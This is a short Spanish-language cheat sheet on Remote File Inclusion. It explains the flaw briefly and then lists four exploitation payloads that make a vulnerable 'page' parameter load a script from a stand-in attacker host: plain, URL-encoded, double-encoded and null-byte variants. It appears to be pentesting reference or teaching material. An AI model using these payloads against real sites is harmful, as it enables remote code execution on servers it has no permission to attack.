# Remote File Inclusion (RFI)

La inclusión remota de archivos (RFI) es un ataque dirigido a vulnerabilidades en aplicaciones web que hacen referencia dinámicamente a scripts externos.

Se puede encontrar en cualquier extremo que incluya un archivo de un servidor web. Por ejemplo, /index.php?page=index.html

# Explotando

1 - Carga útil básica 

    http://example.com/index.php?page=http://attacker/script.php
    
2 - Codificación de URL 

    http://example.com/index.php?page=http%3A%2F%2Fattacker%2Fscript.php
    
3 - Codificación doble 

    http://example.com/index.php?page=http%253A%252F%252Fattacker%252Fscript.php
    
4 - Uso de null byte (%00)     

    http://example.com/index.php?page=http://attacker/script.php%00
